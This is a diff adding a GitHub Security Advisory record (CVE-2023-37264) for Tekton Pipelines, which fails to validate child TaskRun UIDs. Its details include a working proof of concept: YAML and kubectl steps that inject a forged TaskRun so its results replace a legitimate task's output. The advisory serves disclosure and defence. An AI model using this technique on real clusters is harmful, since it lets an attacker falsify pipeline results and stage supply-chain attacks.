@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-w2h3-vvvq-3m53",
+  "modified": "2023-07-07T18:46:19Z",
+  "published": "2023-07-07T18:46:19Z",
+  "aliases": [
+    "CVE-2023-37264"
+  ],
+  "summary": "Pipelines do not validate child UIDs",
+  "details": "### Summary\nPipelines do not validate child UIDs, which means that a user that has access to create TaskRuns can create their own Tasks that the Pipelines controller will accept as the child Task.\n\nWe should add UID to PipelineRun status and validate that child Run status/results only come from Runs matching the same UID. \n\n### Details\nWhile we [store and validate the PipelineRun's (api version, kind, name, uid) in the child Run's OwnerReference](https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372), we only store (api version, kind, name) in the [ChildStatusReference](https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference) .\n\nThis means that if a client had access to create TaskRuns on a cluster, they could create a child TaskRun for a pipeline with the same name + owner reference, and the Pipeline controller picks it up as if it was the original TaskRun. This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.\n\nI believe this is also true for [TaskRuns -> Pods since it looks like we only lookup by name](https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992), though I haven't tested this.\n\nIf you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)\n\n### PoC\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: PipelineRun\nmetadata:\n  name: hello-pr\nspec:\n  pipelineSpec:\n    tasks:\n      - name: task1\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                sleep 60\n      - name: task2\n        runAfter: [task1]\n        taskSpec:\n          steps:\n            - name: echo\n              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n              script: |\n                echo \"asdf\" > $(results.foo.path)\n          results:\n            - name: foo\n    results:\n      - name: foo\n        value: $(tasks.task2.results.foo)\n```\n\nOnce this is running, grab the PR UID:\n\n```sh\n$ k get pr hello-pr -o json | jq .metadata.uid -r\n```\n\nWhile pipeline is running task 1, start fake task 2:\n\n```yaml\napiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\nkind: TaskRun\nmetadata:\n  annotations:\n  labels:\n    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines\n    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks\n    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr\n    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr\n    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2\n  name: hello-pr-task2\n  namespace: default\n  ownerReferences:\n  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)\n    blockOwnerDeletion: true\n    controller: true\n    kind: PipelineRun\n    name: hello-pr\n    uid: af549647-4532-468b-90c5-29122a408f8d <--- this should be UID of PR fetched in last step\nspec:\n  serviceAccountName: default\n  taskSpec:\n    results:\n    - name: foo\n      type: string\n    steps:\n    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)\n      name: echo\n      resources: {}\n      script: |\n        echo \"zxcv\" > $(results.foo.path)\n```\n\nGet pipeline results - it shows the output of the 2nd injected TaskRun\n\n```\n$ k get pr -o json hello-pr | jq .status.pipelineResults\n[\n  {\n    \"name\": \"foo\",\n    \"value\": \"zxcv\\n\"\n  }\n]\n```\n\n### Impact\n\nThis can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline. This requires access to create TaskRuns, so impact may vary depending on your Tekton setup. **If users already have unrestricted access to create any Task/PipelineRun, this does not grant any additional capabilities**.\n\nWorst case example would be a supply chain attack where a malicious TaskRun triggered from Triggers/Workflows intercepts and replaces a task in a trusted Pipeline.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/tektoncd/pipeline"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.35.0"
+            },
+            {
+              "last_affected": "0.52.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tektoncd/pipeline/security/advisories/GHSA-w2h3-vvvq-3m53"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37264"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tektoncd/pipeline"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372"
+    },
+    {
+      "type": "WEB",
+      "url": "https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-345"
+    ],
+    "severity": "LOW",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-07T18:46:19Z",
+    "nvd_published_at": "2023-07-07T17:15:10Z"
+  }
+}
